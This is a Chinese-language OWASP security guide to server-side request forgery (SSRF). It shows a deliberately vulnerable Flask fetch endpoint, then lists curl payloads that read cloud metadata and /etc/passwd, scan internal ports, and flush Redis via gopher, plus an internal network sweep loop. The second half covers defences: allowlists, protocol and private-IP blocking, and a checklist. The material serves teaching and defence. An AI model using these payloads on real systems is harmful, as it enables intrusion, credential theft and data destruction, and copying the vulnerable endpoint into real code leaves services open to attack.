# OWASP Top 10: A10 - 服务端请求伪造 (SSRF)

## 概述

服务端请求伪造（Server-Side Request Forgery）是 OWASP Top 10 2021 新增类别。SSRF 漏洞允许攻击者诱导服务器端应用程序向非预期的位置发起请求。这可以用于访问内部网络服务、绕过防火墙、读取服务器本地文件或执行远程代码。

## 常见漏洞场景

### 1. URL 获取功能
```python
# 漏洞代码
@app.route('/fetch')
def fetch():
    url = request.args.get('url')
    return requests.get(url).text
# 攻击：/fetch?url=http://169.254.169.254/latest/meta-data/
```

### 2. 文件导入功能
- Webhook 回调地址可控
- PDF 生成器中的外部资源加载
- 图片 URL 拉取（头像、缩略图）
- RSS 订阅解析

### 3. 内部服务探测
- 探测内网存活主机和端口
- 访问内部管理界面
- 读取云元数据服务

### 4. 协议利用
- `file:///etc/passwd` 读取本地文件
- `gopher://` 攻击 Redis、MySQL
- `dict://` 端口扫描
- `ftp://` 内网 FTP 服务

## 攻击示例

```bash
# 云元数据泄露（AWS）
curl "https://target.com/proxy?url=http://169.254.169.254/latest/meta-data/"

# 内网端口扫描
curl "https://target.com/proxy?url=http://192.168.1.1:22"
curl "https://target.com/proxy?url=http://192.168.1.1:3306"
curl "https://target.com/proxy?url=http://192.168.1.1:6379"

# 本地文件读取
curl "https://target.com/proxy?url=file:///etc/passwd"

# Gopher 协议攻击 Redis
curl "https://target.com/proxy?url=gopher://127.0.0.1:6379/_*1%0d%0a\$8%0d%0aflushall%0d%0a*3%0d%0a\$3%0d%0aset%0d%0a\$1%0d%0a1%0d%0a\$64%0d%0a..."

# DNS Rebinding
# 使域名先解析为允许的 IP，再解析为内网 IP
```

## 检测方法

```bash
# Burp Suite Collaborator 检测
# 在 URL 参数中插入 Collaborator 地址

# DNSLog 检测
curl "https://target.com/proxy?url=http://xxx.dnslog.cn"

# 内网地址探测
for ip in 192.168.1.{1..254}; do
    curl "https://target.com/proxy?url=http://$ip:80" -w "%{http_code} $ip\n"
done
```

## 防御措施

### 1. 白名单校验
```python
ALLOWED_HOSTS = ["api.example.com", "cdn.example.com"]

def is_allowed(url):
    hostname = urlparse(url).hostname
    return hostname in ALLOWED_HOSTS
```

### 2. 禁用危险协议
```python
# 仅允许 http 和 https
if parsed_url.scheme not in ("http", "https"):
    raise ValueError("不支持的协议")
```

### 3. 禁止内网 IP
```python
import ipaddress

PRIVATE_RANGES = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("169.254.0.0/16"),
]

def is_private(hostname):
    ip = ipaddress.ip_address(socket.gethostbyname(hostname))
    return any(ip in net for net in PRIVATE_RANGES)
```

### 4. DNS 二次解析防护
- 先解析 DNS，校验 IP 后再发起请求
- 配置 DNS 缓存防止 rebinding

### 5. 网络层隔离
- 应用服务器不部署在可访问内网的网段
- 使用防火墙限制出口流量
- 服务之间使用认证（mTLS）

## 综合防御检查表

- [ ] URL 白名单校验
- [ ] 禁用 file、gopher、dict、ftp 等协议
- [ ] 禁止访问内网地址和 localhost
- [ ] DNS 二次解析防 rebinding
- [ ] 请求超时设置（避免 SSRF 盲打延时）
- [ ] 应用服务器网络隔离
- [ ] 不返回原始响应体给客户端
- [ ] 记录所有外发请求日志
